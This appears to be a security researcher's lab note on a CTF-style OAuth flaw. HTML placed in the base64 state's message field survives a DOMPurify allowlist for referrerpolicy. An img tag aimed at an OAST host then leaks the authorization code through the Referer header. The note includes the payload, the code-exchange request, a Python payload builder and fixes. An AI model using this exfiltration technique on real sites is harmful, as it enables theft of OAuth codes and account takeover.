# DOMPurify referrerpolicy OAuth State Referer Leak

## Date

2026-07-11

## Target Type

OAuth login flows where `state` is base64 JSON with a user-influenced `message` field, error pages sanitize `message` with DOMPurify, and reviewer bots visit attacker-supplied OAuth URLs

## Bug Class

HTML injection in OAuth state, DOMPurify attribute allowlist bypass (`referrerpolicy`), OAuth authorization code exfiltration via Referer header

## Initial Signal

- Homepage OAuth link contains base64-decodable `state` JSON like:
  `{"timestamp":...,"status":"ok","token":"...","message":""}`
- OAuth failure lands on `/error?code=...&state=...` (code remains in query string)
- Error page loads DOMPurify and inline script:
  `document.getElementById('message-container').innerHTML = DOMPurify.sanitize(rawMessage)`
- Custom DOMPurify hook whitelists `referrerpolicy` on `A`, `IMG`, `IFRAME`
- Non-empty `message` in `state` keeps flow on error page even when code is valid
- Reviewer bot accepts Google OAuth URLs via `POST /report`

## Pattern

### State structure

```json
{"timestamp": 1783726185, "status": "ok", "token": "<session-bound-token>", "message": "<HTML payload>"}
```

Encode with standard base64 (no padding issues: server accepts URL-safe form in query).

Attacker reads `token` from their own homepage OAuth link, then crafts two states:

| State | `message` | Purpose |
|-------|-----------|---------|
| Exfil | `<img referrerpolicy="unsafe-url" src="https://[oast]/x">` | Force error page + Referer leak |
| Clean | `""` | Exchange stolen code to profile |

Both must use the **same `token`** from attacker session.

### Exfil mechanism

1. Bot completes OAuth with exfil `state` + `prompt=none`.
2. App redirects to `/error?code=AUTHORIZATION_CODE&state=...`.
3. Browser executes inline script; sanitized `<img>` loads OAST.
4. With `referrerpolicy="unsafe-url"`, request includes full page URL in `Referer` → `code=` leaks.

### Exchange

Attacker must **not** reuse exfil `state` for callback exchange (non-empty `message` re-triggers error path). Use clean `state` with empty `message`:

```bash
GET /callback?code=STOLEN&state=<clean_base64_state>
```

## Trust boundary failure

DOMPurify blocks script execution but explicitly preserves `referrerpolicy="unsafe-url"` on subresource tags. Attacker HTML in OAuth `state.message` becomes active markup that exfiltrates sensitive query parameters from the error page URL.

## Common mistake

- Reusing sl2 OAuth CSRF (staged code, no exfil) — sl1 requires Referer leak
- Reusing sl3 logger/hybrid exfil — no `/logger` on sl1
- Exchanging with exfil `state` — stays on error page; use clean `state`
- Forgetting to copy `token` from attacker homepage into crafted JSON

## Minimal test

```python
import base64, json, urllib.parse

state = base64.b64encode(json.dumps({
    "timestamp": 1,
    "status": "ok",
    "token": "x",
    "message": '<img referrerpolicy="unsafe-url" src="https://[oast]/x">'
}, separators=(',', ':')).encode()).decode()

# After valid code obtained:
# GET /callback?code=VALID&state=urllib.parse.quote(state)
# → error page; OAST should show Referer with code=
```

## Fix

- Render `message` as text, not HTML
- Remove `referrerpolicy` from DOMPurify allowlist
- Set `Referrer-Policy: no-referrer` on OAuth error pages
- Do not reflect OAuth `code` in URLs shown alongside attacker-controlled HTML
- Validate `state` server-side; do not trust client-decoded JSON fields for HTML rendering

## Related

- `writeups/solo-leveling-htmli-gate-oauth-referrer-leak.md`
- `payloads/oauth/dompurify-referrerpolicy-state-message-referer-exfil.md`
- `notes/oauth-tk-state-csrf-staged-code-exchange.md` (sl2 variant — no exfil)
- `notes/oauth-hybrid-response-fragment-logger-exfil.md` (sl3 variant — logger)
- `notes/dompurify-post-render-global-gadget-clobbering.md` (clobber variant — different sink)
- `labs/2026-07-11-solo-leveling-htmli-gate-oauth-referrer-leak.md`
